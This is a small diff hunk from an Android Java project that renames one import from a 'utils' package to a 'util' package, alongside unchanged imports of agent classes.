@@ -15,7 +15,7 @@ import android.util.Log;
 
 import com.ht.RCSAndroidGUI.agent.AgentBase;
 import com.ht.RCSAndroidGUI.agent.AgentConf;
-import com.ht.RCSAndroidGUI.utils.Check;
+import com.ht.RCSAndroidGUI.util.Check;
 
 // TODO: Auto-generated Javadoc
 /**
